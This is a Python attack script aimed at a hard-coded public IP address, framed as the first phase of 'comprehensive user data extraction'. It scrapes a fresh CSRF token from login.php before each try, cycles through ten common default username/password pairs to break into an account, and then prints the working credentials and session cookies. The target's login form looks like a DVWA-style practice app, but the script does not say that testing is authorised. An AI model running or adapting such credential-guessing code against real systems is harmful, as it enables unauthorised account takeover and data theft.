
import requests
import re
from urllib.parse import quote

session = requests.Session()
url = "http://31.97.117.123"

print("[*] Starting comprehensive user data extraction...")
print("[*] Target: http://31.97.117.123")
print("\n" + "="*100)
print("PHASE 1: AUTHENTICATION & CREDENTIAL DISCOVERY")
print("="*100)

# Get login page
login_page = session.get(f"{url}/login.php")
match = re.search(r"user_token'\s+value='([^']+)'", login_page.text)
user_token = match.group(1) if match else ""

# Try common default credentials
credentials_to_try = [
    ("admin", "admin"),
    ("admin", "password"),
    ("user", "password"),
    ("admin", "admin123"),
    ("user", "user"),
    ("admin", "letmein"),
    ("administrator", "administrator"),
    ("admin", "123456"),
    ("root", "root"),
    ("guest", "guest"),
]

attempt = 0
login_success = False

for username, password in credentials_to_try:
    attempt += 1
    print(f"\n[Attempt {attempt}] Testing: {username}:{password}", end=" ")
    
    # Get fresh login page with new token
    login_page = session.get(f"{url}/login.php")
    match = re.search(r"user_token'\s+value='([^']+)'", login_page.text)
    user_token = match.group(1) if match else ""
    
    data = {
        "username": username,
        "password": password,
        "user_token": user_token,
        "Login": "Login"
    }
    
    response = session.post(f"{url}/login.php", data=data, allow_redirects=True)
    
    if "logout" in response.text.lower() or "dashboard" in response.text.lower():
        print(f"✓ SUCCESS")
        print(f"[+] CREDENTIALS FOUND: {username}:{password}")
        login_success = True
        authenticated_user = username
        break
    else:
        print(f"✗ Failed")
    
    if attempt >= 10:
        print("\n[!] Reached 10 unsuccessful attempts limit")
        break

if not login_success:
    print("\n[-] Could not authenticate with any default credentials")
    exit(1)

print(f"\n[+] Successfully authenticated as: {authenticated_user}")
print(f"[+] Session established: {session.cookies.get_dict()}")


